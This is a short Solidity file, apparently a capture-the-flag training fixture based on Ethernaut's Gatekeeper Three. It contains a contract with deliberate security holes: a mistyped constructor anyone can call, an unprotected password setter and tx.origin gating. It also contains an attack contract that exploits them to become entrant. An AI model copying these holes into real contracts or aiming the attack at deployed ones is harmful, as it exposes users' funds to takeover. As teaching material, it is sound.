// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract EthernautGatekeeperThree {
    address public entrant;
    bool public allowEntrant;
    bytes32 public password;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(password == bytes32(uint256(uint160(tx.origin)) & 0xFFFFFFFFFFFFFFFF));
        _;
    }

    modifier gateThree() {
        require(allowEntrant);
        _;
    }

    function construct0r() public {
        allowEntrant = true;
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    function setPassword(bytes32 newPassword) public {
        password = newPassword;
    }
}

contract GatekeeperThreeAttack {
    function attack(EthernautGatekeeperThree target, bytes32 password_) external {
        target.setPassword(password_);
        target.construct0r();
        target.enter();
    }
}

// Local training fixture: password is stored publicly; the attacker reads it
// and calls construct0r() (typo constructor) to become entrant.

